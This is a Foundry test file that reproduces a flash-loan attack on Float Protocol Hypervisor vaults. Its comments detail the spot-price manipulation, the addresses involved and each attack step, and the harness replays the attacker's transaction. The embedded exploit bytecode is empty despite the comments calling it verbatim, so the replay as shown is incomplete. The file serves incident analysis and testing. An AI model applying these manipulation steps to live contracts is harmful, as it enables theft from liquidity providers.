pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Float Protocol Hypervisor (Gamma/Visor-style concentrated-liquidity vault) — spot-price
// deposit/withdraw manipulation — Ethereum. Attacker net gain ~10.70 ETH (~$28K) in a single
// flash-loan-funded tx.
//
// Exploit tx   : 0x3d7549db65344da2a41067e17791b17fac16ec6b8e5132e82e243f6541de5cff (block 25874402)
// Attacker EOA : 0xAEA29218262dc6b0904Ca077f6527C49dfd426D9 (tx.origin, nonce 8)
// Attack ctrt  : 0xb46655eb5b77de277063a75586d1883e951b6c54 (the flash-loan borrower, Morpho callback target)
//
// The exploit tx is a CONTRACT-CREATION tx (to == null): the whole attack runs inside the created
// contract's constructor. That outer contract requires tx.origin == the attacker EOA, deploys the
// inner attack/callback contract (0xb466...), runs the manipulation, and selfdestructs the profit
// straight to the attacker EOA. There is no separate deploy tx and no privileged/admin/signer path
// anywhere in it — see the "permissionless" note below.
//
// Protocol addresses touched (read out of the exact creation bytecode):
//   Hypervisor A : 0x85cbed523459b7f6f81c11e710df969703a8a70c (Float Protocol Hypervisor, deposit/withdraw)
//   Hypervisor B : 0xc86b1e7fa86834cac1468937cdd53ba3ccbc1153 (Float Protocol Hypervisor, deposit/withdraw)
//   Uni V3 pool  : 0xe8c2030686fc3b0161ee1def0e8d01dfe4fac0ac (the hypervisors' underlying pool)
//   WETH         : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (pool token0, flash-loaned asset)
//   pair token   : 0xb05097849bca421a3f51b249ba6cca4af4b97cb9 (pool token1, the other underlying)
//   Morpho Blue  : 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb (WETH flash-loan source)
//
// Root cause (reproducible contract mechanism, verified against the on-chain trace, NOT a
// key/signer/privileged-claim compromise):
//   Float's Hypervisor prices LP shares off getTotalAmounts(), which values the vault's Uniswap V3
//   position at the pool's INSTANTANEOUS slot0 spot price, with no TWAP and no deviation/slippage
//   guard on the permissionless deposit()/withdraw() path. So the attacker pushes the V3 tick with a
//   large flash-loan-funded swap on the underlying pool, deposits into the hypervisors while the
//   valuation is skewed, moves the tick back, and withdraws a richer token mix than deposited. Two
//   hypervisors share the one pool, so both are drained by the same tick move.
//
// Trace evidence (18-decimal; both underlying tokens are 18dp):
//   1. Morpho flash loan 1000 WETH (0x3635c9adc5dea00000) -> attack contract 0xb466...
//      (Morpho FlashLoan + WETH Transfer events in the receipt, receiver = 0xb466...).
//   2. Large WETH -> token1 swap on the V3 pool to skew slot0.
//   3. deposit into Hypervisor 0x85cb... and Hypervisor 0xc86b... at the skewed spot valuation.
//   4. swap the tick back toward its original level.
//   5. withdraw both hypervisor positions, redeeming a richer mix; repay 1000 WETH to Morpho.
//   6. leftover WETH is unwrapped; the contract selfdestructs, sending all ETH to the attacker EOA.
//      The bytecode hard-guards a >= 10.7 ETH (0x947e094f18ae0000) balance floor before that
//      selfdestruct, which is the reported ~10.71 ETH figure.
//
// Permissionless: the only access check in the whole exploit is tx.origin == the attacker EOA in the
// outer constructor (a self-protection check, not a protocol permission), plus the Morpho flash-loan
// callback asserting its own caller. The hypervisor deposit()/withdraw() calls and the pool swaps are
// all plain public calls made by an arbitrary unprivileged contract with itself as the share
// receiver. No owner/admin/whitelist/signature path is used.
//
// This PoC reproduces the real tx faithfully: it replays the EXACT on-chain creation bytecode of the
// exploit tx (hardcoded verbatim, no attack logic reconstructed), deploying it with the attacker EOA
// pranked as both msg.sender and tx.origin, at the state of block-1. The created contract's own
// address differs from the on-chain one, but the bytecode is byte-identical and every victim address
// it touches is hardcoded, so the manipulation runs identically.
//
// Run:
//   forge test --contracts ./src/test/2026-08/FloatProtocol_exp.sol -vvv

contract FloatProtocol_exp is Test {
    address internal constant ATTACKER = 0xAEA29218262dc6b0904Ca077f6527C49dfd426D9;
    address internal constant HYPERVISOR_A = 0x85CBeD523459b7f6F81C11e710DF969703a8A70C;
    address internal constant HYPERVISOR_B = 0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153;
    address internal constant POOL = 0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    // Exact input of the exploit tx 0x3d7549db... (this is a create tx, so the input IS the
    // constructor/creation bytecode), copied verbatim.
    bytes internal constant CREATION_CODE =
        hex"";

    function setUp() public {
        // block-1: real protocol state immediately before the exploit tx executed.
        vm.createSelectFork("mainnet", 25874401);
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        uint256 eoaBefore = ATTACKER.balance;
        emit log_named_decimal_uint("attacker ETH before", eoaBefore, 18);

        // Replay the real exploit tx: deploy the exact on-chain creation bytecode with the attacker
        // EOA as both msg.sender and tx.origin (the constructor requires tx.origin == attacker and
        // runs the entire attack, selfdestructing the profit back to the EOA).
        vm.prank(ATTACKER, ATTACKER);
        bytes memory code = CREATION_CODE;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "exploit replay failed");

        uint256 eoaGain = ATTACKER.balance - eoaBefore;
        emit log_named_decimal_uint("attacker ETH after", ATTACKER.balance, 18);
        emit log_named_decimal_uint("attacker net gain (ETH)", eoaGain, 18);

        // Net gain matches the reported ~10.71 ETH (~$28K). On-chain the EOA also paid gas for the
        // tx, so the balance delta there was 10.7037 ETH; in the harness gas is not charged to the
        // pranked EOA, so the full selfdestruct payout (~10.7066 ETH) lands here.
        assertGe(eoaGain, 10.7 ether, "gain below the bytecode's 10.7 ETH profit floor");
        assertApproxEqAbs(eoaGain, 10.706 ether, 0.02 ether, "gain off traced ~10.71 ETH");
    }
}
